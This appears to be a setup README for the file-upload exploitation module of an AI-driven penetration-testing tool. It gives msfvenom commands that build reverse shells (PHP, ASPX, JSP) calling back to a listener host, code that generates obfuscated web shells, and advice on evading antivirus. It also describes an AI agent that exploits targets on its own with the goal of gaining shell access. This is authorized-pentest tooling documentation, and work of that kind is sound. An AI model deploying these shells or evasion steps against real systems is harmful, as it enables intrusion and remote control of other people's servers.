# File Upload Exploitation Setup

## ⚠️ Important Security Notice

Due to Windows Defender and antivirus restrictions, the full file upload exploitation module with web shell payloads cannot be automatically installed.

## Current Status

The Scorpion AI pentest system has been enhanced to support file upload exploitation, but requires manual configuration of the actual web shell payloads.

## File Structure

- **Integration Point**: `ai_pentest.py` (line ~2780) - File upload exploitation routing
- **Exploit Module**: `file_upload_exploit.py` - Currently a stub implementation

## What's Implemented

✅ File upload exploitation framework
✅ Integration with AI pentest `exploit_vuln` tool
✅ Result handling and reporting
✅ Fallback to existing upload methods

## What Requires Manual Configuration

❌ Web shell payloads (PHP, ASPX, JSP, ASP)
❌ Extension bypass techniques (40+ variations)
❌ RCE verification logic
❌ Reverse shell triggering

## Manual Setup Instructions

### Option 1: External Web Shells

1. Download web shells from trusted security research repositories:
   - **PHP**: PentestMonkey reverse shells, p0wny-shell
   - **ASPX**: aspx-reverse-shell
   - **JSP**: jsp-reverse-shell

2. Place web shells in: `tools/python_scorpion/src/python_scorpion/data/shells/`

3. Update `file_upload_exploit.py` to load shells from disk instead of hardcoding

### Option 2: Generate Payloads with MSFVenom

```bash
# PHP reverse shell
msfvenom -p php/reverse_php LHOST=192.168.70.1 LPORT=4444 -f raw > shell.php

# ASPX reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.70.1 LPORT=4444 -f aspx > shell.aspx

# JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.70.1 LPORT=4444 -f raw > shell.jsp
```

### Option 3: Use Existing Scorpion Tools

The `advanced_shells.py` module already has shell generation capabilities:

```python
from python_scorpion.advanced_shells import ShellGenerator

generator = ShellGenerator()
php_shell = generator.generate_web_shell("php", obfuscate=True)
```

## Testing File Upload Exploitation

Once configured, test with:

```bash
scorpion ai-pentest -t http://192.168.70.6:8080 \
  -r high \
  -g gain_shell_access \
  -i "find and exploit file upload at /index.php/upload"
```

## Expected Behavior

When the AI detects a file upload vulnerability:

1. **With Full Module**: Uploads web shells with 40+ extension bypasses, verifies RCE, triggers reverse shell
2. **With Stub** (current): Falls back to existing payload generation in `ai_pentest.py`

## Integration Flow

```
AI Pentest
  └─> detect "file upload" vulnerability
      └─> call exploit_vuln tool
          └─> _run_exploit() method (line 2652)
              └─> try: import file_upload_exploit
                  ├─> SUCCESS: Use FileUploadExploiter class
                  └─> ImportError: Fallback to existing upload logic
```

## Security Considerations

- ⚠️ Only use in authorized penetration testing
- ⚠️ Web shells are detected as malware by antivirus
- ⚠️ Consider using encrypted/obfuscated payloads
- ⚠️ Always clean up uploaded shells after testing

## Alternative: Docker Container

To avoid antivirus issues, run Scorpion in a Docker container:

```dockerfile
FROM kalilinux/kali-rolling
RUN apt-get update && apt-get install -y python3 python3-pip
COPY . /scorpion
WORKDIR /scorpion
RUN pip3 install -e tools/python_scorpion
# Web shells can be added here without AV interference
```

## Contributing

If you develop a working file upload exploitation module that bypasses AV restrictions, please contribute back to the project!

## References

- [Metasploit MSFVenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
- [PentestMonkey Reverse Shells](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [PayloadsAllTheThings - File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)

---

**Last Updated**: $(Get-Date)
**Status**: Stub implementation - requires manual configuration
